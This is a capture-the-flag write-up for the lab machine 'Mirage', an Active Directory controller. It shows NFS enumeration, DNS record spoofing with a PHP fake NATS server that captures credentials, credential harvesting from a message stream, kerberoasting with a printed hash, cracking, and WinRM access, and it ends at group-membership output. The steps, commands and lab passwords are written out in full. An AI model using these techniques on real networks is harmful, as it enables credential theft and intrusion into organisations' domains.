# Mirage

## Recon

::: details nmap_scan.log
```log
Open 10.10.11.78:53
Open 10.10.11.78:88
Open 10.10.11.78:111
Open 10.10.11.78:135
Open 10.10.11.78:139
Open 10.10.11.78:389
Open 10.10.11.78:445
Open 10.10.11.78:464
Open 10.10.11.78:593
Open 10.10.11.78:636
Open 10.10.11.78:2049
Open 10.10.11.78:3269
Open 10.10.11.78:3268
Open 10.10.11.78:4222
Open 10.10.11.78:5985
Open 10.10.11.78:9389
Open 10.10.11.78:47001
Open 10.10.11.78:55734
Open 10.10.11.78:55744
Open 10.10.11.78:55747
Open 10.10.11.78:55762
Open 10.10.11.78:55768
Open 10.10.11.78:55781
Open 10.10.11.78:55797
Open 10.10.11.78:57019
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.78

PORT      STATE SERVICE         REASON  VERSION
53/tcp    open  domain          syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec    syn-ack Microsoft Windows Kerberos (server time: 2025-07-27 01:25:38Z)
111/tcp   open  rpcbind?        syn-ack
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc           syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn     syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap            syn-ack Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Issuer: commonName=mirage-DC01-CA/domainComponent=mirage
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-04T19:58:41
| Not valid after:  2105-07-04T19:58:41
| MD5:   da96:ee88:7537:0dcf:1bd4:4aa3:2104:5393
| SHA-1: c25a:58cc:950f:ce6e:64c7:cd40:e98e:bb5a:653f:b9ff
| -----BEGIN CERTIFICATE-----
| MIIF7DCCBNSgAwIBAgITSQAAAAmly5tE1w7/PwABAAAACTANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGbWlyYWdl
| MRcwFQYDVQQDEw5taXJhZ2UtREMwMS1DQTAgFw0yNTA3MDQxOTU4NDFaGA8yMTA1
| MDcwNDE5NTg0MVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALa/
| UqJSM0syaGI7mm4Lr9IL/U/MhGhXROelD/gGqiTHoDgDAugm6/pqICUKvJJNfX8S
| 5Npt0EGfwOPT4orzfEBneKPwywSRrPw1ciJ2wtGcQnWgMMP8/HdgHyW1Gl2L66Gk
| W2th/k2NzPnTQW2C5bt3/JDjaLYpIYyPdMygLlfHH1LAilEed6ozrRrW08rXvTXM
| xw6AqFYZr0yoE6KDHTO/ZgKcMF7YPDeOaA3c2ldCOYnxuTbI9GPzYzPvdU7cKQFj
| tFL2oce7l8bsPAsyPPoXZrGjxLpyPyQTS1ro0xyrRAze/qlPpcXck8P9Zz8K/n3I
| WPsovpeg2m0lnLa2bmkCAwEAAaOCAxUwggMRMDUGCSsGAQQBgjcVBwQoMCYGHisG
| AQQBgjcVCMjXb5WWb4ShjTGC+KE0g9nnbiwBIQIBbgIBADAyBgNVHSUEKzApBggr
| BgEFBQcDAgYIKwYBBQUHAwEGCisGAQQBgjcUAgIGBysGAQUCAwUwDgYDVR0PAQH/
| BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwEw
| DAYKKwYBBAGCNxQCAjAJBgcrBgEFAgMFMB0GA1UdDgQWBBT/gvokffsC/s7mtzMs
| 6SqQe6+ThzAfBgNVHSMEGDAWgBTJ+IdMlVv6ldc/u1Z6Kjb0idAthzCBywYDVR0f
| BIHDMIHAMIG9oIG6oIG3hoG0bGRhcDovLy9DTj1taXJhZ2UtREMwMS1DQSgxKSxD
| Tj1kYzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2
| aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW1pcmFnZSxEQz1odGI/Y2VydGlmaWNh
| dGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlv
| blBvaW50MIG/BggrBgEFBQcBAQSBsjCBrzCBrAYIKwYBBQUHMAKGgZ9sZGFwOi8v
| L0NOPW1pcmFnZS1EQzAxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2
| aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW1pcmFnZSxEQz1o
| dGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25B
| dXRob3JpdHkwMQYDVR0RAQH/BCcwJYIPZGMwMS5taXJhZ2UuaHRiggptaXJhZ2Uu
| aHRiggZNSVJBR0UwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
| MS01LTIxLTIxMjcxNjM0NzEtMzgyNDcyMTgzNC0yNTY4MzY1MTA5LTEwMDAwDQYJ
| KoZIhvcNAQELBQADggEBAG38vHTJ2FmA2Z/wHABxLDIpQHEns0U2n7SbyGQ//7NQ
| G7buS1JmPLajj4OC0Kzoy7bEbrtcWApVxRwFHoAQHmUH0RlQEhcOxXoWEMLVgTil
| FfP+pf4dWfu4l1cZq/uFguc4nVbNgCkZPZo1bC6s0UJcaM4ylPkPED5L+WWeirFV
| 24r7DPZj4V9UaE1/Hklli6J9RhIU1rTZZHixKDCAGNTIZ5HiaTO6MhmEyS5z2yIY
| C8UJBHDnKSfMZhG+z2VnoRlPK8i0oNg8DL2SzlxmAVjlSdpvz+Q9wTFWhgepH5P8
| rpwi2htMcsDvYoIjkMtm2AjeGJkI1q5Cb2L0f+wl/FU=
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds?   syn-ack
464/tcp   open  kpasswd5?       syn-ack
593/tcp   open  ncacn_http      syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap        syn-ack Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Issuer: commonName=mirage-DC01-CA/domainComponent=mirage
 
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  nlockmgr        syn-ack 1-4 (RPC #100021)
3268/tcp  open  ldap            syn-ack Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Issuer: commonName=mirage-DC01-CA/domainComponent=mirage

3269/tcp  open  ssl/ldap        syn-ack Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Issuer: commonName=mirage-DC01-CA/domainComponent=mirage

4222/tcp  open  vrml-multi-use? syn-ack
| fingerprint-strings: 
|   GenericLines: 
|     INFO {"server_id":"NA3YHMKESASIUMGJ6FNCZ2DBZRRRZZRYUXBO3HJLV75M27P4IAIF4DOO","server_name":"NA3YHMKESASIUMGJ6FNCZ2DBZRRRZZRYUXBO3HJLV75M27P4IAIF4DOO","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":197,"client_ip":"10.10.14.37","xkey":"XD7NWCGKFWTBCYHWN2FRL77G6LVYF3RSJ7HJRQLKMHC4VB5BPIAQGTCO"} 
|     -ERR 'Authorization Violation'
|   GetRequest: 
|     INFO {"server_id":"NA3YHMKESASIUMGJ6FNCZ2DBZRRRZZRYUXBO3HJLV75M27P4IAIF4DOO","server_name":"NA3YHMKESASIUMGJ6FNCZ2DBZRRRZZRYUXBO3HJLV75M27P4IAIF4DOO","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":198,"client_ip":"10.10.14.37","xkey":"XD7NWCGKFWTBCYHWN2FRL77G6LVYF3RSJ7HJRQLKMHC4VB5BPIAQGTCO"} 
|     -ERR 'Authorization Violation'
|   HTTPOptions: 
|     INFO {"server_id":"NA3YHMKESASIUMGJ6FNCZ2DBZRRRZZRYUXBO3HJLV75M27P4IAIF4DOO","server_name":"NA3YHMKESASIUMGJ6FNCZ2DBZRRRZZRYUXBO3HJLV75M27P4IAIF4DOO","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":199,"client_ip":"10.10.14.37","xkey":"XD7NWCGKFWTBCYHWN2FRL77G6LVYF3RSJ7HJRQLKMHC4VB5BPIAQGTCO"} 
|     -ERR 'Authorization Violation'
|   NULL: 
|     INFO {"server_id":"NA3YHMKESASIUMGJ6FNCZ2DBZRRRZZRYUXBO3HJLV75M27P4IAIF4DOO","server_name":"NA3YHMKESASIUMGJ6FNCZ2DBZRRRZZRYUXBO3HJLV75M27P4IAIF4DOO","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":196,"client_ip":"10.10.14.37","xkey":"XD7NWCGKFWTBCYHWN2FRL77G6LVYF3RSJ7HJRQLKMHC4VB5BPIAQGTCO"} 
|_    -ERR 'Authentication Timeout'
5985/tcp  open  http            syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf          syn-ack .NET Message Framing
47001/tcp open  http            syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
55734/tcp open  msrpc           syn-ack Microsoft Windows RPC
55744/tcp open  ncacn_http      syn-ack Microsoft Windows RPC over HTTP 1.0
55747/tcp open  msrpc           syn-ack Microsoft Windows RPC
55762/tcp open  msrpc           syn-ack Microsoft Windows RPC
55768/tcp open  msrpc           syn-ack Microsoft Windows RPC
55781/tcp open  msrpc           syn-ack Microsoft Windows RPC
55797/tcp open  msrpc           syn-ack Microsoft Windows RPC
57019/tcp open  msrpc           syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-27T01:26:37
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 38031/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 42844/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 62882/udp): CLEAN (Failed to receive data)
|   Check 4 (port 44589/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 6h59m58s
```
:::

## NFS

There's available NFS mounts readable by anyone
```bash
‚îî‚îÄ$ showmount -e 10.10.11.78
Export list for 10.10.11.78:
/MirageReports (everyone)

‚îî‚îÄ$ sudo mount -t nfs 10.10.11.78:/MirageReports /mnt/tmpmount

‚îî‚îÄ$ ls -alh /mnt/tmpmount
Permissions Size User   Date Modified Name
.rwx------@ 8.5M nobody 20 May 11:08  ÔáÅ Incident_Report_Missing_DNS_Record_nats-svc.pdf
.rwx------@ 9.4M nobody 26 May 17:37  ÔáÅ Mirage_Authentication_Hardening_Report.pdf

‚îî‚îÄ$ mkdir reports 
‚îî‚îÄ$ sudo cp /mnt/tmpmount/*  reports/
‚îî‚îÄ$ sudo chown $USER:$USER . -R
‚îî‚îÄ$ sudo umount /mnt/tmpmount
```

New hostname: `nats-svc.mirage.htb`

![Writeup.png](/assets/pentest/htb/mirage/Writeup.png)

![Writeup-2.png](/assets/pentest/htb/mirage/Writeup-2.png)

Also from report we see potential username `Dev_Account_A`

No NTLM authentication, only Kerberos :(

![Writeup-1.png](/assets/pentest/htb/mirage/Writeup-1.png)

At the end "Contact: `ad-security@mirage.htb`", another username.

## NATS

There's unusual service running at port 4222:
```bash
‚îî‚îÄ$ nc 10.10.11.78 4222
INFO {"server_id":"NA3YHMKESASIUMGJ6FNCZ2DBZRRRZZRYUXBO3HJLV75M27P4IAIF4DOO","server_name":"NA3YHMKESASIUMGJ6FNCZ2DBZRRRZZRYUXBO3HJLV75M27P4IAIF4DOO","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":235,"client_ip":"10.10.14.37","xkey":"XD7NWCGKFWTBCYHWN2FRL77G6LVYF3RSJ7HJRQLKMHC4VB5BPIAQGTCO"}
-ERR 'Authentication Timeout'
```

```json
{
    "server_id": "NA3YHMKESASIUMGJ6FNCZ2DBZRRRZZRYUXBO3HJLV75M27P4IAIF4DOO",
    "server_name": "NA3YHMKESASIUMGJ6FNCZ2DBZRRRZZRYUXBO3HJLV75M27P4IAIF4DOO",
    "version": "2.11.3",
    "proto": 1,
    "git_commit": "a82cfda",
    "go": "go1.24.2",
    "host": "0.0.0.0",
    "port": 4222,
    "headers": true,
    "auth_required": true,
    "max_payload": 1048576,
    "jetstream": true,
    "client_id": 235,
    "client_ip": "10.10.14.37",
    "xkey": "XD7NWCGKFWTBCYHWN2FRL77G6LVYF3RSJ7HJRQLKMHC4VB5BPIAQGTCO"
}
```

**[nats-server](https://github.com/nats-io/nats-server)**: High-Performance server for NATS.io, the cloud and edge native messaging system.

Welp without credentials we cannot query anything from server so it's stalemate.

### DNS Spoofing

From the PDFs we know few thingy about the `nats-svc` record
1. It doesn't exist in **DNS Zone**
2. It's not **static**
3. **DNS Scavenging** is on

Using [nsupdate](https://linux.die.net/man/8/nsupdate) we can submit Dynamic DNS Update request, tcpdump for debug, and lastly fake socket for other clients to connect to us.

```php
<?php
$host = '0.0.0.0';
$port = 4222;
$server = stream_socket_server("tcp://$host:$port", $errno, $errstr);

if (!$server) { die("Error: $errstr ($errno)\n"); }

echo "[+] Listening on $host:$port\n";

while ($conn = @stream_socket_accept($server)) {
    fwrite($conn, "INFO {\"server_id\":\"LetMeIn\",\"version\":\"2.11.3\",\"headers\":true,\"auth_required\":true}\r\n");

    while (!feof($conn)) {
        $line = fgets($conn);
        if ($line === false) break;
        
        $line = trim($line);
        echo "[>] Client said: '$line'\n";

        if ($line === "exit") { echo "[*] Exit command received, closing connection.\n"; break; }
    }

    fclose($conn);
}
?>
```

![Writeup-3.png](/assets/pentest/htb/mirage/Writeup-3.png)

```bash
[>] Client said: 'CONNECT {"verbose":false,"pedantic":false,"user":"Dev_Account_A","pass":"hx5h7F5554fP@1337!","tls_required":false,"name":"NATS CLI Version 0.2.2","lang":"go","version":"1.41.1","protocol":1,"echo":true,"headers":true,"no_responders":true}'
```

> Creds: `Dev_Account_A:hx5h7F5554fP@1337!`

### Service Interaction

Quick start: 
- [The coolest OSS project you've never heard of: NATS Getting started!](https://www.youtube.com/watch?v=hjXIUPZ7ArM)
- [Introduction to NATs Part 1: A lightweight messaging platform](https://medium.com/@ansabiqbal/introduction-to-nats-part-1-a-lightweight-messaging-platform-fbcf1d462823)

Get [natcli](https://github.com/nats-io/natscli) to interact with service.
```bash
‚îî‚îÄ$ go install github.com/nats-io/natscli/nats@latest
```

```bash
‚îî‚îÄ$ nats context add --server 'nats://mirage.htb:4222' --description 'Mirage' --user 'Dev_Account_A' --password='hx5h7F5554fP@1337!' mirage
‚îî‚îÄ$ nats context select mirage
‚îî‚îÄ$ nats server info
nats: error: no results received, ensure the account used has system privileges and appropriate permissions
```

We can subscribe to events and listen on what's going on between processes. Following 3 requests repeat
```bash
‚îî‚îÄ$ nats sub '>'
12:55:29 Subscribing on >
[#1] Received on "$JS.API.STREAM.INFO.auth_logs" with reply "_INBOX.29p6FqkmEy8ci67CNdzX0p.Hq6d8fd2"
nil body

[#2] Received on "_INBOX.29p6FqkmEy8ci67CNdzX0p.Hq6d8fd2"
{
    "type": "io.nats.jetstream.api.v1.stream_info_response",
    "total": 0,
    "offset": 0,
    "limit": 0,
    "config": {
        "name": "auth_logs",
        "subjects": ["logs.auth"],
        "retention": "limits",
        "max_consumers": -1,
        "max_msgs": 100,
        "max_bytes": 1048576,
        "max_age": 0,
        "max_msgs_per_subject": -1,
        "max_msg_size": -1,
        "discard": "new",
        "storage": "file",
        "num_replicas": 1,
        "duplicate_window": 120000000000,
        "compression": "none",
        "allow_direct": true,
        "mirror_direct": false,
        "sealed": false,
        "deny_delete": true,
        "deny_purge": true,
        "allow_rollup_hdrs": false,
        "consumer_limits": {},
        "allow_msg_ttl": false,
        "metadata": {
            "_nats.level": "1",
            "_nats.req.level": "0",
            "_nats.ver": "2.11.3"
        }
    },
    "created": "2025-05-05T07:18:19.6244845Z",
    "state": {
        "messages": 5,
        "bytes": 570,
        "first_seq": 1,
        "first_ts": "2025-05-05T07:18:56.6788658Z",
        "last_seq": 5,
        "last_ts": "2025-05-05T07:19:27.2106658Z",
        "num_subjects": 1,
        "consumer_count": 2
    },
    "cluster": {
        "leader": "NA3YHMKESASIUMGJ6FNCZ2DBZRRRZZRYUXBO3HJLV75M27P4IAIF4DOO"
    },
    "ts": "2025-07-27T23:56:01.8057477Z"
}

[#3] Received on "$JS.EVENT.ADVISORY.API"
{
    "type": "io.nats.jetstream.advisory.v1.api_audit",
    "id": "9Qb3UqeZlUUXmgKguoj2Yg",
    "timestamp": "2025-07-27T23:56:01.8057477Z",
    "server": "NA3YHMKESASIUMGJ6FNCZ2DBZRRRZZRYUXBO3HJLV75M27P4IAIF4DOO",
    "client": {
        "start": "2025-07-27T16:56:01.8046708-07:00",
        "host": "10.10.11.78",
        "id": 1617,
        "acc": "dev",
        "user": "Dev_Account_A",
        "name": "NATS CLI Version 0.2.2",
        "lang": "go",
        "ver": "1.41.1",
        "rtt": 538400,
        "server": "NA3YHMKESASIUMGJ6FNCZ2DBZRRRZZRYUXBO3HJLV75M27P4IAIF4DOO",
        "kind": "Client",
        "client_type": "nats"
    },
    "subject": "$JS.API.STREAM.INFO.auth_logs",
    "response": "{RESPONSE #2 IN JSON}"
}
```

General enum shows there's are no consumers
```bash
‚îî‚îÄ$ nats consumer ls auth_logs
No Consumers defined
```

We can create new consumer and then query for any messages it may have.
```bash
‚îî‚îÄ$ nats consumer add auth_logs letmein
[mirage] ? Delivery target (empty for Pull Consumers)
[mirage] ? Start policy (all, new, last, subject, 1h, msg sequence) all
[mirage] ? Acknowledgment policy all
[mirage] ? Replay policy instant
[mirage] ? Filter Stream by subjects (blank for all)
[mirage] ? Maximum Allowed Deliveries -1
[mirage] ? Maximum Acknowledgments Pending 0
[mirage] ? Deliver headers only without bodies No
[mirage] ? Add a Retry Backoff Policy No
...
                    Name: letmein
               Pull Mode: true
          Deliver Policy: All
              Ack Policy: All
                Ack Wait: 30.00s
           Replay Policy: Instant
         Max Ack Pending: 1,000
       Max Waiting Pulls: 512
...
‚îî‚îÄ$ nats consumer next auth_logs letmein --timeout=3m
[13:49:43] subj: logs.auth / tries: 1 / cons seq: 1 / str seq: 1 / pending: 4

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message
```

## Lateral Movement (`nathan.aadam`)

David is a valid account on AD.

List the users on box (and optionally save usernames).
```bash
‚îî‚îÄ$ faketime -f +7h netexec smb dc01.mirage.htb -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -k --users | tee users_output.txt
SMB                      dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB                      dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
SMB                      dc01.mirage.htb 445    dc01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB                      dc01.mirage.htb 445    dc01             Administrator                 2025-06-23 21:18:18 0       Built-in account for administering the computer/domain
SMB                      dc01.mirage.htb 445    dc01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB                      dc01.mirage.htb 445    dc01             krbtgt                        2025-05-01 07:42:23 0       Key Distribution Center Service Account
SMB                      dc01.mirage.htb 445    dc01             Dev_Account_A                 2025-05-27 14:05:12 0
SMB                      dc01.mirage.htb 445    dc01             Dev_Account_B                 2025-05-02 08:28:11 0
SMB                      dc01.mirage.htb 445    dc01             david.jjackson                2025-05-02 08:29:50 0
SMB                      dc01.mirage.htb 445    dc01             javier.mmarshall              2025-05-25 18:44:43 0       Contoso Contractors
SMB                      dc01.mirage.htb 445    dc01             mark.bbond                    2025-06-23 21:18:18 0
SMB                      dc01.mirage.htb 445    dc01             nathan.aadam                  2025-06-23 21:18:18 0
SMB                      dc01.mirage.htb 445    dc01             svc_mirage                    2025-05-22 20:37:45 0       Old service account migrated by contractors
SMB                      dc01.mirage.htb 445    dc01             [*] Enumerated 10 local users: MIRAGE
‚îî‚îÄ$ cat users_output.txt | grep 2025 | awk '{print($5)}' | tee users.txt
Administrator
krbtgt
Dev_Account_A
Dev_Account_B
david.jjackson
javier.mmarshall
mark.bbond
nathan.aadam
svc_mirage
```

Get bloodhound data
```bash
‚îî‚îÄ$ faketime -f +7h bloodhound-python -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -ns 10.10.11.78 -d mirage.htb -c All --zip -op david
```

Nothing eye catching on this user.

![Writeup-4.png](/assets/pentest/htb/mirage/Writeup-4.png)

To get inside the machine we need `nathan.aadam`

![Writeup-5.png](/assets/pentest/htb/mirage/Writeup-5.png)

### Kerberoasting

```bash
‚îî‚îÄ$ faketime -f +7h netexec ldap dc01.mirage.htb -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -k --kerberoasting output.txt
LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        dc01.mirage.htb 389    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
LDAP        dc01.mirage.htb 389    DC01             [*] Skipping disabled account: krbtgt
LDAP        dc01.mirage.htb 389    DC01             [*] Total of records returned 1
LDAP        dc01.mirage.htb 389    DC01             [*] sAMAccountName: nathan.aadam, memberOf: ['CN=Exchange_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb', 'CN=IT_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb'], pwdLastSet: 2025-06-23 17:18:18.584667, lastLogon: 2025-07-04 16:01:43.511763
LDAP        dc01.mirage.htb 389    DC01             $krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb\nathan.aadam*$6121e9d4abeeef46a4d7bac364ea7d6f$f5aca5573928b6811b021948f408ec623457278fd81f2f35522717c2a31b0bcdfdac651993de5fb36c49ad8293bc1e596c22f09b27a153934c3fbb386f9c5a31301e5c996490f13bc666812a790c25b95e8555f96a6202648442be2dd3302a91ac58481d91fd65a57f5584624d9ba838e4706ad61aa31a33a68eb483ea08660544cec3a11c63b89ab2d81813dac14d4897e1efc675284ce566ff3193b286c124ee7905b0bb6403bbc56cb7f6e7d55466f4ea6ded79a74501ec915bc96351752f2a142d40b9a0379098af8e37881e3e2b746cfee29ec38667b6a1073a5faf13d549ecf7dfb33c900aeaf6d971d25fb9131b06f58d9b4520402328bfaecfa799887ea863439537c7fca8927557709c4e13b5ae012fa5fc7d53ba0161f8d2cb5139aa9bdfe0683b2572f9f396b938d05303105fae53fbb2bc47cbc04792f15039dd11279e35c8b49199831006cdc6cf5cbe652cfcaa163202b2c8bd0b82fb0d64fc54e2dd2754eea8bc34dd49532bc0c429b6a17145daf63b2ad1af4cad71d4b55a853181704a51743a83a2e29fa8d2ea05b734e6ccdd1638583c864180fb5bff3b9648ab076af774a129d5b2c01fccadb031912d1f07587ee26e2472574fce870490e577080f9d34cc3992dd87456c1218708c8c50bace68b45218bd970dedb2598fee339e51cda45749e12846c4b9c9cab753bad985269b2a0c4fdc17d33a867aeb7b74e6905eeeb949d779129085262a5c84cb2fd6d05ef205a1f08683288378b8ae3f02def599154afd8b09e725e8579f2f81da23bffdc358232b168fc4b29d5b20e5c315c510547b7194cd1ba2d5e87d9ba577acc380d99d2ffe904ca67741599ca727079ecd6a4020c28574cbeb073e317f875f6e076dba46888c5980f02f4c09bd19dd547278992af53ecb160242ec8cd7787086c7af286f942549d4e815f077eef78265e60696d8c8ae8a435cec2ab4777e3d9110e84aca3a60e64e01e34d399251f69a79b8bd9a3f1bce525704f371639faa278bbbfc7316e1f5ffeca7e83c523ea3c17c0575ec58f84f5057221ee715aa6ae06e0c66c8820c27c69aeeeaf8cd43dbbe11309f144c7e042c973186c3c2ac4b6da82d572bccc36a8ba662e80fc2fb9c356d09e9e74a3c125cb210ac9881dd84f618d24dfb4330acfeabae4e92d5f9e9a0150a02233f2d87130b028197c5f5f1943195ba6c7c835b2200a5f270d963396a319d7f84eb7170db0963b28a034bfc90d04436f2bd01ec8b11cdd8a47cb2806013dcee0b8930b75ac94b3ac63273dd17ea6707ce7a4d919767160ffbbc4fa60428fb8810afa8837b492f59d40fde21e58cb46ee21e0b05079548e280f82e716f56443736d9216f28aff985e791e7be5c64dd543badf3a4d2319108c64c09780d1168e6135f896882e341d4e639ca108a5889474a9e040d8eebb720104beb0f7bc9187f0542a13795335000ff574e83283004865d9a5a65ead69fe970cb3b52e81fdd138236c2330a1065813d2261fe8ef13ad03eec69b2b1e96aec9664305342fc537332005896a292eec466c6cec828ef32a6
```

```bash
‚ûú .\john-1.9.0-jumbo-1-win64\run\john.exe .\hashes.txt --wordlist=.\rockyou.txt
3edc#EDC3        (?)
```

```bash
‚îî‚îÄ$ faketime -f +7h netexec smb dc01.mirage.htb -u 'nathan.aadam' -p '3edc#EDC3' -k --shares
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\nathan.aadam:3edc#EDC3
SMB         dc01.mirage.htb 445    dc01             [*] Enumerated shares
SMB         dc01.mirage.htb 445    dc01             Share           Permissions     Remark
SMB         dc01.mirage.htb 445    dc01             -----           -----------     ------
SMB         dc01.mirage.htb 445    dc01             ADMIN$                          Remote Admin
SMB         dc01.mirage.htb 445    dc01             C$                              Default share
SMB         dc01.mirage.htb 445    dc01             IPC$            READ            Remote IPC
SMB         dc01.mirage.htb 445    dc01             NETLOGON        READ            Logon server share
SMB         dc01.mirage.htb 445    dc01             SYSVOL          READ            Logon server share
```

## WinRM

```bash
‚îî‚îÄ$ sudo netexec smb dc01.mirage.htb --generate-krb5-file /etc/krb5.conf
SMB         10.10.11.78     445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)

‚îî‚îÄ$ faketime -f +7h netexec smb dc01.mirage.htb -u 'nathan.aadam' -p '3edc#EDC3' -k --generate-tgt nathan
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\nathan.aadam:3edc#EDC3
SMB         dc01.mirage.htb 445    dc01             [+] TGT saved to: nathan.ccache
SMB         dc01.mirage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=nathan.ccache

‚îî‚îÄ$ export KRB5CCNAME=nathan.ccache

‚îî‚îÄ$ faketime -f +7h evil-winrm -i dc01.mirage.htb -r mirage.htb
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> whoami /all

User Name           SID
=================== ==============================================
mirage\nathan.aadam S-1-5-21-2127163471-3824721834-2568365109-1110

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
